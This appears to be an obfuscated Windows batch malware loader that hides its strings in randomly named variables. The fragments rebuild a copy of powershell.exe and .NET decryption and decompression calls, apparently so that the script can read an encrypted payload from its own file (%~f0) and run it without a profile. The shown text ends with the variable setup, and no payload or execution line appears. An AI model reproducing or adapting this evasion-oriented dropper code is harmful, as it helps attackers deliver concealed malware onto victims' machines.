@echo off
set "DvIuBlNruD=32"
set "PbIWxkSESR=rS"
set "DSbCIZrPen=0\"
set "yuaAfBqGrH=ll"
set "QVRNZoaDBc=\W"
set "vdnZezzsNH=in"
set "KhaPsMzZUE=do"
set "xuasuYJAXl=s\"
set "EQJTSkHyQx=ll"
set "EllJhmttqn=ws"
set "hlgqBLKCal=em"
set "iJfNxjRhPc=y "
set "rrYdxJxeAF=\v"
set "LFJptuJabW=Sy"
set "pGdVdnEVmd=co"
set "fsfSmluJaj=py"
set "iitwQrCFmY=st"
set "RDJDUzpwuy=rs"
set "OjtkydePyZ=Wi"
set "yLDEXzcptX=xe"
set "HDQyVGsdOn=1."
set "fKVvknWGGm=nd"
set "ahQSwZKkza=.e"
set "hcBulbZkYl=we"
set "rHZmbnPwZg=he"
set "RwGNYAVTJi=ow"
set "DtNuzOhYco=po"
set "mCkRNwDjxt= /"
set "icKwpQvioy= C"
set "KgaYPAhJqb=Po"
set "MuDMSJUbun=we"
set "fEwmjeOaJI=:\"
set "ggbAXEgcaS=he"
set "UUlKtUxgAQ= %~dp0"
set "CWaNRLPfto=cd"
set "FdKhFKNddh=m.IO"
set "cqsSelnuvc=form"
set "WkbqnfbYcX=daeR"
set "diiPPIfVkC=;$yA"
set "cWYwNtTDOe=tem."
set "JJuhFMzCQP=esaB"
set "onOqOmKWkE=.Cre"
set "eDxvVWCjHt= if "
set "EFkiwWWoRy=ach "
set "OWaeKxdMDN=)($d"
set "xOXXiBzDXz=yulB"
set "skLhszXhga=trea"
set "iQzjdXnNtG=m(, "
set "hmYvWozAop=ect "
set "dqfKzpIwxH=ne);"
set "WHVhwWpYds=IXbL"
set "owYCCaigUu=dj0C"
set "OqTwPsFPxe=:: '"
set "ZwRfjbnFjJ=PKCS"
set "IRUZflcAEc=y.Ci"
set "DQxNAxfWnD=in $"
set "AZJvtKxybt=)))"
set "jwVriWRjHb=g = "
set "xNrGqnRbWj=Secu"
set "NHFUfOdKTy=C = "
set "WrcCulmcrt=C = "
set "xJchsyvBEU=Bmor"
set "qvrAXKLBhX= [Sy"
set "jxpMFzFnMw=pose"
set "ucOgmdCndr=New-"
set "KHlQYuwCvo=106u"
set "swWTcXIKGK=oint"
set "rwPtwdAgSZ=, $d"
set "cLBOELmaFg=comm"
set "zxWGwNISth=yste"
set "fCUqxmSytU=C, 0"
set "EmyzULWooU=ment"
set "APIVPvNFun=s75K"
set "zaccSPpSsT='')("
set "qOEzqDjlyT=Disp"
set "oGyMuOseRa=::('"
set "TvWDFxhmvD=  $r"
set "AQgJlAnJMG=V = "
set "qMycRkRakU=tem."
set "kAOxQZtsKR=[-1."
set "XbtYxkRMXN=WEt."
set "hkWFNuliLf=-Obj"
set "UcHQqqQppp=);$t"
set "UddjgkrryT=E = "
set "dmTBxHhGLF=.Key"
set "ARrMrbrTxI=esMa"
set "cfYKvSFsQe=lit("
set "gdauzwyFcC=IXbL"
set "dQGnIeidDf=.-16"
set "iDOUQqphZs=..-1"
set "SobqqBvVxc=;$ae"
set "LvkdmmYmQv=Disp"
set "nqPxUHXPfn=.Con"
set "VSanStBiGd=ert]"
set "FWywOcQcRN=WC);"
set "hornXQmzED=tem."
set "ApRGzPyssw=Obje"
set "vAIChzMczj=t Sy"
set "NWwUUTOhLU=rtS4"
set "VFbhuaGTGq='gni"
set "pLXIscxvwf=m.Re"
set "VbLZxoDJzm=RVMV"
set "iiaPDfhaPz=vkIL"
set "hJPapkPmnk=);$A"
set "TOSInxcBBu=pStr"
set "IjnRglnFyc= [Sy"
set "QUYJNLxFdg=('%~f0'"
set "ymDQWKYIHW=-joi"
set "HIzOqosJlW=();$"
set "WBVVyEoExf=.Cop"
set "OPdqSFTQVq=-nop"
set "FVfaYYLPFn=orF'"
